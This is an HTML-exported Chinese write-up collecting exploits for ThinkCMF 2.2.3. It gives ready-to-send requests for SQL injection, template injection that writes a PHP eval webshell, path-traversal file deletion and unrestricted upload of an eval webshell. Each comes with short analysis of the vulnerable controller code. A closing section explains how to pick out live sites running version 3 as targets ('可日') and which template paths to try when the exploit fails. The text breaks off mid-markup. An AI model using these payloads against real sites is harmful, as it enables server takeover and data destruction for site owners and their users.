<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="thinkcmf-223-漏洞合集"><span class="csDE05BCC">ThinkCMF 2.2.3 </span><span class="csECDA2D3">漏洞合集</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">ThinkCMF 2.x</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X6839ecbe034762037637784fc2b2c18009f9acc"><span class="csD1E291E2">0x01 </span><span class="csD6CA00D2">前台用户文章编辑提交存在注入</span></a></h3>
		<h4 class="cs868C439D">
			<a name="Xdbaa48b0b8cd7e134ad49e52f11d817ac75cfc9"><span class="csBF12A472">0x01.1 </span><span class="cs6EDCDAE2">漏洞演示</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">前台的文章编辑中操作框架注入，所以可以直接</span><span class="cs9FB05234">sql</span><span class="cs7FFD2630">注入</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url:http://thinkcmf.test/index.php?g=Portal&amp;m=Article&amp;a=edit_post</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">term:123</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post[post_title]:123</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post[post_title]:aaa</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post_title:123</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post[id][0]:bind</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post[id][1]:0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image0.png" width="560" height="343" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="X7bd0e3ca8a9dc0f6a88142b059409dd840865ca"><span class="csBF12A472">0x01.2 </span><span class="cs6EDCDAE2">漏洞原理</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">文件：</span><span class="cs8926E06">ThinkCMFX_2.2.3\application\Portal\Controller\ArticleController.class.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">public function edit_post(</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image0.jpg" width="560" height="296" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里不多讲，因为没得意义。详情请看先知的历史</span><span class="cs8926E06">tp</span><span class="cs9C1B1871">漏洞，谢谢：</span><span class="cs8926E06">)</span></p><h4 class="cs868C439D">
			<a name="X537d4acb3588fd3d9bfb5522b57efa68f2e8424"><span class="csBF12A472">0x02 </span><span class="cs6EDCDAE2">前台模版注入漏洞</span><span class="csBF12A472">-</span><span class="cs6EDCDAE2">可</span><span class="csBF12A472">getshell</span><span class="cs6EDCDAE2">两处</span></a></h4>
		<h5 class="cs868C439D">
			<a name="X668ebba1aa48a6ca52f90c56a984c741b38bb7d"><span class="cs4B51D5E4">0x02.1 Comment</span><span class="cs1C2E50E7">类模版引擎注入演示</span></a></h5>
		<p class="cs3A447A38"><span class="cs9FB05234">url:http://thinkcmf.test/index.php?g=Comment&amp;m=Widget&amp;a=fetch</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">templateFile=/../public/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">prefix=&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">content=&lt;php&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php eval($_REQUEST[11]);&#39;)&lt;/php&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">发送之后页面</span><span class="cs8926E06">http</span><span class="cs9C1B1871">状态会为</span><span class="cs8926E06">200</span><span class="cs9C1B1871">，这样就表示成功了</span><span class="cs8926E06"> </span><span class="cs9C1B1871">简单讲解一下：</span><span class="cs8926E06">content </span><span class="cs9C1B1871">我输入了</span><span class="cs8926E06">php</span><span class="cs9C1B1871">代码所以他会在本地跟路径创建一个一句话木马</span><span class="cs8926E06">test.php </span><span class="cs9C1B1871">所以实战过程中。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">连接马子：</span><span class="cs8926E06"><a class="cs508254C" href="http://xxxxx.com/test.php"><span class="cs4B51D5E4">http://xxxxx.com/test.php</span></a></span><span class="cs8926E06"> </span><span class="cs9C1B1871">密码</span><span class="cs8926E06">:11 </span><span class="cs9C1B1871">即可</span><span class="cs8926E06">getshell</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image1.jpg" width="560" height="379" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image2.jpg" width="560" height="417" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="X4a548e46ab002d6ad5c690cbf19886feab3e755"><span class="csBF12A472">0x02.2 Api</span><span class="cs6EDCDAE2">类模版注入</span><span class="csBF12A472">1</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">url:http://thinkcmf.test/index.php?g=Api&amp;m=Plugin&amp;a=fetch</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">templateFile=/../../../public/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">prefix=&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">content=&lt;php&gt;file_put_contents(&#39;test1.php&#39;,&#39;&lt;?php eval($_REQUEST[11]);&#39;)&lt;/php&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">同上一样，会在跟目录生成</span><span class="cs8926E06"> </span><span class="cs9C1B1871">马子</span><span class="cs8926E06"> test1.php</span></p><h4 class="cs868C439D">
			<a name="Xb460a238ba2d4198130e51857e0941b1fb31c5b"><span class="csBF12A472">0x02.3 </span><span class="cs6EDCDAE2">漏洞原理</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">路径</span><span class="cs8926E06">:ThinkCMFX\application\Comment\Controller\WidgetController.class.php </span><span class="cs9C1B1871">路径</span><span class="cs8926E06">:ThinkCMFX\application\Api\Controller\PluginController.class.php</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">两处的漏洞原理都是一样的，所以我就选一处进行讲解了</span><span class="cs8926E06"> </span><span class="cs9C1B1871">路径</span><span class="cs8926E06">:application\Comment\Controller\WidgetController.class.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">public function fetch()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image3.jpg" width="560" height="106" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从名字查看我们会发现他的</span><span class="cs8926E06">3</span><span class="cs9C1B1871">个参数</span></p><p class="cs40DD2BC9"><span class="cs8926E06">$templateFile=</span><span class="cs9C1B1871">模版地址</span><span class="cs8926E06"> $content=</span><span class="cs9C1B1871">内容</span><span class="cs8926E06"> $prefix=</span><span class="cs9C1B1871">前缀</span></p><p class="cs40DD2BC9"><span class="cs8926E06">$templateFile</span><span class="cs9C1B1871">就是我们要包含的文件了，我们必须包含一个不然，代码会报错，导致无法写</span><span class="cs8926E06">shell $content </span><span class="cs9C1B1871">我们写马子的地方</span><span class="cs8926E06"> $prefix </span><span class="cs9C1B1871">忽略他即可，没有用的</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在代码中我们看到一个</span><span class="cs8926E06"> $templateFile </span><span class="cs9C1B1871">给</span><span class="cs8926E06">parseTemplate</span><span class="cs9C1B1871">函数包含了，这里我们也不用管他，因为他的作用就是判断一下文件是否存在而已，所以我们在实战的时候，可以找到一处</span><span class="cs8926E06">html</span><span class="cs9C1B1871">文件包含即可</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而</span><span class="cs8926E06">tp</span><span class="cs9C1B1871">的模版引擎</span><span class="cs8926E06"> </span><span class="cs9C1B1871">使用的是</span><span class="cs8926E06"> smarty </span><span class="cs9C1B1871">而</span><span class="cs8926E06">smarty</span><span class="cs9C1B1871">中只要可控制内容的</span><span class="cs8926E06">key </span><span class="cs9C1B1871">与</span><span class="cs8926E06"> value </span><span class="cs9C1B1871">即可写入</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">命令，所以同理可得，</span><span class="cs8926E06">tp</span><span class="cs9C1B1871">的</span><span class="cs8926E06"> $content </span><span class="cs9C1B1871">我们可控</span><span class="cs8926E06"> = </span><span class="cs9C1B1871">有模版注入</span></p><h4 class="cs868C439D">
			<a name="X676cdd290588cc34a01b459a57b9176d9a280b8"><span class="csBF12A472">0x03 </span><span class="cs6EDCDAE2">任意文件删除</span><span class="csBF12A472">-</span><span class="cs6EDCDAE2">只能</span><span class="csBF12A472">windows</span><span class="cs6EDCDAE2">删除</span></a></h4>
		<h5 class="cs868C439D">
			<a name="X7aaa0df945a5f6bb4778315e1081a40d4d64386"><span class="cs4B51D5E4">0x03.1 </span><span class="cs1C2E50E7">漏洞演示</span></a></h5>
		<p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image4.jpg" width="560" height="422" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">url</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">http://thinkcmf.test/index.php?g=User&amp;m=Profile&amp;a=do_avatar</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">mgurl=..\..\..\..\..\1.txt</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image5.jpg" width="560" height="373" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="X213269b324b4c7137607b240bd8003cffdf01fc"><span class="csBF12A472">0x03.2 </span><span class="cs6EDCDAE2">漏洞原理</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">路径：</span><span class="cs8926E06">ThinkCMFX\application\User\Controller\ProfileController.class.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">blic function do_avatar(</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image6.jpg" width="560" height="240" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从文件可以看到</span><span class="cs8926E06"> $imgurl=str_replace(&#39;/&#39;,&#39;&#39;,$imgurl); </span><span class="cs9C1B1871">过滤了</span><span class="cs8926E06"> / </span><span class="cs9C1B1871">但是没有过滤</span><span class="cs8926E06"> </span><span class="cs9C1B1871">所以我们无法引入</span><span class="cs8926E06"> / </span><span class="cs9C1B1871">并且在更新头像以后还会从前端接收参数</span><span class="cs8926E06"> imgurl </span><span class="cs9C1B1871">带入函数</span><span class="cs8926E06">sp_delete_avatar </span><span class="cs9C1B1871">跟进去</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">路径：</span><span class="cs8926E06">ThinkCMFX\application\Common\Common\function.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">function sp_delete_avatar(</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image7.jpg" width="560" height="280" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="Xd4690271295243effd08265b8205401ff061eda"><span class="csBF12A472">0x04 </span><span class="cs6EDCDAE2">前台任意上传漏洞</span></a></h4>
		<h5 class="cs868C439D">
			<a name="X5a9ee9f8ac0e4eef26b4d28915cbb9efcdbdcb8"><span class="cs4B51D5E4">0x04.1 </span><span class="cs1C2E50E7">漏洞演示</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">记得一定要登录</span><span class="cs8926E06">! </span><span class="cs9C1B1871">记得一定要登录</span><span class="cs8926E06">! </span><span class="cs9C1B1871">记得一定要登录</span><span class="cs8926E06">! </span><span class="cs9C1B1871">记得在前台注册一个账号进行登录或是直接登录后台然后在访问此地址</span></p><p class="cs3A447A38"><span class="cs7FFD2630">打开</span><span class="cs9FB05234">url: http://atest.test/cms/ThinkCMFX_2.2.3/index.php?g=Asset&amp;m=Ueditor&amp;a=upload&amp;action=uploadfile</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">POST:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">file = php</span><span class="cs7FFD2630">一句话木马的文件</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">1.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">eval($_REQUEST[1]); </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image1.png" width="560" height="279" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">shell</span><span class="cs7FFD2630">地址</span><span class="cs9FB05234">: http://atest.test/cms/ThinkCMFX_2.2.3/data/upload/ueditor/20190724/5d3833dcce7e3.php?1=phpinfo();</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image2.png" width="560" height="367" alt="" style="border-width:0px;" /></span></p><h5 class="cs868C439D">
			<a name="X8685d144e3c7b9f1bc3fda9effab8bd2d4b4de1"><span class="cs4B51D5E4">0x04.2 </span><span class="cs1C2E50E7">为什么要登录</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">路径：</span><span class="cs8926E06">ThinkCMFX\application\Asset\Controller\UeditorController.class.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">public function _initialize()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image3.png" width="560" height="365" alt="" style="border-width:0px;" /></span></p><h5 class="cs868C439D">
			<a name="X3121f6897e023db44d35f2429050afb70f3a451"><span class="cs4B51D5E4">0x04.3 </span><span class="cs1C2E50E7">漏洞原理</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">路径：</span><span class="cs8926E06">ThinkCMFX\application\Asset\Controller\UeditorController.class.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">public function upload(</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image4.png" width="560" height="508" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">路径：</span><span class="cs8926E06">ThinkCMFX\application\Asset\Controller\UeditorController.class.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">private function _ueditor_upload</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image5.png" width="560" height="293" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">该方法使用</span><span class="cs8926E06"> $upload_setting=sp_get_upload_setting(); </span><span class="cs9C1B1871">先获取所有上传的配置</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在用</span><span class="cs8926E06"> $allowed_exts=explode(&#39;,&#39;, $upload_setting[$filetype]); </span><span class="cs9C1B1871">来获取允许上传的后缀</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里我们先跟进去查看</span><span class="cs8926E06"> sp_get_upload_setting(); </span><span class="cs9C1B1871">函数</span><span class="cs8926E06"> </span><span class="cs9C1B1871">路径：</span><span class="cs8926E06">application\Common\Common\function.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">function sp_get_upload_setting()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image6.png" width="560" height="477" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接下来我们需要重点查看一下：</span><span class="cs8926E06">$upload_setting[$filetype] </span><span class="cs9C1B1871">我们可以打印一下</span><span class="cs8926E06">,</span><span class="cs9C1B1871">看看他的返回值</span><span class="cs8926E06"> </span><span class="cs9C1B1871">路径</span><span class="cs8926E06">: application\Asset\Controller\UeditorController.class.php </span><span class="cs9C1B1871">方法</span><span class="cs8926E06">: private function _ueditor_upload( </span><span class="cs9C1B1871">代码</span><span class="cs8926E06">: $upload_setting[$filetype]</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image7.png" width="560" height="374" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image8.png" width="560" height="328" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后我们在看看他的代码</span><span class="cs8926E06"> $allowed_exts=explode(&#39;,&#39;, $upload_setting[$filetype]); </span><span class="cs9C1B1871">路径</span><span class="cs8926E06">: application\Asset\Controller\UeditorController.class.php </span><span class="cs9C1B1871">方法</span><span class="cs8926E06">: private function _ueditor_upload( </span><span class="cs9C1B1871">代码</span><span class="cs8926E06">: $allowed_exts=explode(&#39;,&#39;, $upload_setting[$filetype]); $upload_setting[$filetype] </span><span class="cs9C1B1871">执行以后返回的结果是数组并且为</span><span class="cs8926E06">2:</span></p><p class="cs3A447A38"><span class="cs9FB05234">array(2) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;[&quot;upload_max_filesize&quot;]=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;string(5) &quot;10240&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;[&quot;extensions&quot;]=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;string(42) &quot;txt,pdf,doc,docx,xls,xlsx,ppt,pptx,zip,rar&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而这里用了</span><span class="cs8926E06">php</span><span class="cs9C1B1871">函数</span><span class="cs8926E06">: explode </span><span class="cs9C1B1871">让我们看看这个函数的作用</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image9.png" width="560" height="495" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">把字符串转成数组</span><span class="cs8926E06">,</span><span class="cs9C1B1871">可是他返回的就是数组所以</span><span class="cs8926E06"> $allowed_exts=explode(&#39;,&#39;, $upload_setting[$filetype]); </span><span class="cs9C1B1871">执行返回空</span><span class="cs8926E06"> </span><span class="cs9C1B1871">让我们测试一下看看</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">路径</span><span class="cs8926E06">: application\Asset\Controller\UeditorController.class.php </span><span class="cs9C1B1871">方法</span><span class="cs8926E06">: private function _ueditor_upload()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image10.png" width="560" height="327" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image11.png" width="560" height="267" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image12.png" width="560" height="307" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进去</span><span class="cs8926E06">tp</span><span class="cs9C1B1871">的上传方法查看一下</span><span class="cs8926E06"> </span><span class="cs9C1B1871">路径：</span><span class="cs8926E06">ThinkCMFX_2.2.3\simplewind\Core\Library\Think\Upload.class.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">public function upload()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image13.png" width="560" height="471" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">路径：</span><span class="cs8926E06">ThinkCMFX_2.2.3\simplewind\Core\Library\Think\Upload.class.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">private function check()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image14.png" width="560" height="435" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">路径：</span><span class="cs8926E06">ThinkCMFX_2.2.3\simplewind\Core\Library\Think\Upload.class.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">private function checkExt()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image15.png" width="560" height="213" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为这里返回了</span><span class="cs8926E06">true</span><span class="cs9C1B1871">所以实际上他并没有验证后缀</span><span class="cs8926E06"> </span><span class="cs9C1B1871">所以我们也就多了一个任意文件上传漏洞</span></p><h4 class="cs868C439D">
			<a name="X532aa1a0c10ed7be8b08f7c6043bc1695ba97ae"><span class="csBF12A472">0x05 </span><span class="cs6EDCDAE2">使用说明</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">前面说了，</span><span class="cs8926E06">thinkcmf </span><span class="cs9C1B1871">并没有死，并且有</span><span class="cs8926E06">3</span><span class="cs9C1B1871">版本与</span><span class="cs8926E06">5</span><span class="cs9C1B1871">版本这里提供一些方法，帮助你们辨别哪一些是可以日的，那一些事不行的。</span></p><h5 class="cs868C439D">
			<a name="X15e43125dd42fff013226d34d4bd178ff9588df"><span class="cs4B51D5E4">1</span><span class="cs1C2E50E7">，看</span><span class="cs4B51D5E4">logo 3</span><span class="cs1C2E50E7">的</span><span class="cs4B51D5E4">logo</span><span class="cs1C2E50E7">是黄色的例如下图</span></a></h5>
		<p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image8.jpg" width="560" height="201" alt="" style="border-width:0px;" /></span></p><h5 class="cs868C439D">
			<a name="Xe24abba36bda08663b7926170bc58a23a4db019"><span class="cs4B51D5E4">2</span><span class="cs1C2E50E7">，在网站</span><span class="cs4B51D5E4">url </span><span class="cs1C2E50E7">后面输入</span><span class="cs4B51D5E4"> admin</span></a></h5>
		<p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image16.png" width="560" height="275" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果页面是蓝色的表示是</span><span class="cs8926E06">3</span><span class="cs9C1B1871">的，可日穿之</span></p><h5 class="cs868C439D">
			<a name="Xc24ed9f2c9f6815d0b944902070f902863f3dc4"><span class="cs4B51D5E4">3</span><span class="cs1C2E50E7">，查看</span><span class="cs4B51D5E4"> README.md</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在网站</span><span class="cs8926E06">url</span><span class="cs9C1B1871">后面输入</span><span class="cs8926E06">README.md</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image9.jpg" width="560" height="195" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">另外还有一个说明，你在实际操作的过程中，可能会遇到他一直报这个错</span></p><p class="cs3A447A38"><span class="cs9FB05234">url:http://thinkcmf.test/index.php?g=Comment&amp;m=Widget&amp;a=fetch</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">templateFile=/../public/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">prefix=&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">content=&lt;php&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php eval($_REQUEST[11]);&#39;)&lt;/php&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/THINKCMFX_2.2.3%e6%bc%8f%e6%b4%9e%e5%90%88%e9%9b%86_files/image10.jpg" width="560" height="321" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">请放心这并不是说明漏洞不可使用，而是说，这个模版不存在，你可以换一个</span><span class="cs8926E06">html</span><span class="cs9C1B1871">即可</span></p><p class="cs3A447A38"><span class="cs7FFD2630">例如：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../public/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../public/exception</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../data/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../data/runtime/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../plugins/Mobileverify/View/admin_index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../plugins/Mobileverify/View/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../plugins/Mobileverify/View/widget</span><span class="cs8926E06"><br/></span><span 